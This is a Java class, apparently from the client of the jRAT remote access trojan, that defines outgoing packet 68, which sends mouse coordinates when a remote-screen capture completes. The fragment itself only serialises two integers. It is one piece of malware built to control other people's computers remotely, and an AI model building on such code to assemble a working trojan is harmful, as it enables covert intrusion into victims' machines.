package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet68RemoteScreenComplete extends AbstractOutgoingPacket {

	private int mouseX;
	private int mouseY;
	
	public Packet68RemoteScreenComplete(int mouseX, int mouseY) {
		this.mouseX = mouseX;
		this.mouseY = mouseY;
	}

	@Override
	public void write(Connection con) throws Exception {
        con.writeInt(mouseX);
        con.writeInt(mouseY);
	}

	@Override
	public short getPacketId() {
		return (byte) 68;
	}
}
